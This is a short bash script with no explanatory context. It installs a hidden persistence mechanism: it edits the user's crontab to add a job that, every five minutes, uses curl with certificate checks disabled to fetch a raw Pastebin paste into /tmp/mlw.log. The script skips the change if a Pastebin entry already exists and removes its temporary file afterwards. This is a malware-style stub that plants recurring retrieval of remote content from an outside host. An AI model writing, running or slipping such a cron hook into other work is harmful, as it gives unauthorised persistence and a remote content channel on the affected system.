#!/bin/bash

TMP_CRON=/tmp/cron.tmp

/usr/bin/crontab -l > $TMP_CRON

if ! grep -q pastebin $TMP_CRON
then
	echo '*/5 * * * * /usr/bin/curl -X GET https://pastebin.com/raw/kXNCigqv -k > /tmp/mlw.log' >> $TMP_CRON
fi

/usr/bin/crontab $TMP_CRON

rm -f $TMP_CRON
